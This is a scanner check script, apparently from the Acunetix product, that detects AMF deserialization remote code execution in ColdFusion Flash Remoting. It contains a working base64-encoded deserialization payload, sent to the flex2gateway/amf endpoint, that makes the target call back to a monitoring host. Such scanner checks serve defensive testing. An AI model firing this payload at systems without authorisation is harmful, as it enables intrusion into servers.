/**
title: ColdFusion AMF Deserialization RCE
tags: coldfusion
description:
    Tests for the AMF deserialization RCE in ColdFusion Flash Remoting
**/

/// <reference path="../../native.d.ts"/>

let flow = ax.loadModule("/lib/utility/flow.js").flow(scanState);
let acumonitor = ax.loadModule("/lib/utility/acumonitor.js");
let rnd = ax.loadModule("/lib/utility/random.js");

// alert the vulnerability
function alert(job, acumonitor_data) {
    scanState.addVuln({
        typeId: 'ColdFusion_AMF_Deser.xml',
        tags: ["verified", "acumonitor", "confidence.100"],
        location: scriptArg.location,
        http: job,
        details: { "acumonitor_data": acumonitor_data },
        detailsType: 1
    });
}

// OOB test for AMF deserialization
function main() {

    let startPayload = ax.util.base64Decode('AAMAAAABAAAAAP////8RCgczc3VuLnJtaS5zZXJ2ZXIuVW5pY2FzdFJlZgA=');
    let endPayload = ax.util.base64Decode('AAAnD/lqdnt83mhPdtiqPQAAAVuwTB2BgAEACg==');
    let rndToken = acumonitor.signToken('hit' + rnd.randStrDigits(10));
    let endpoint = `${rndToken}.${acumonitor.AMServer}`;
    let amfPayload = startPayload + String.fromCharCode(endpoint.length) + endpoint + endPayload;

    // build from scratch 
    var job = ax.http.job();
    job.setUrl(scriptArg.location.url);
    job.request.method = "POST";

    job.request.uri = job.request.uri + 'flex2gateway/amf';
    job.request.addHeader("Content-Type", "application/x-amf");
    job.request.body = amfPayload;

    let http = ax.http.execute(job).sync();

    var result = acumonitor.verifyInjectionDNS(rndToken, ["AAAA", "A"]);

    // check if vulnerable
    if (result) {
        alert(job, result);
        return true;
    }

}

if (acumonitor.checkAcumonitor(scanState)) { main(); }
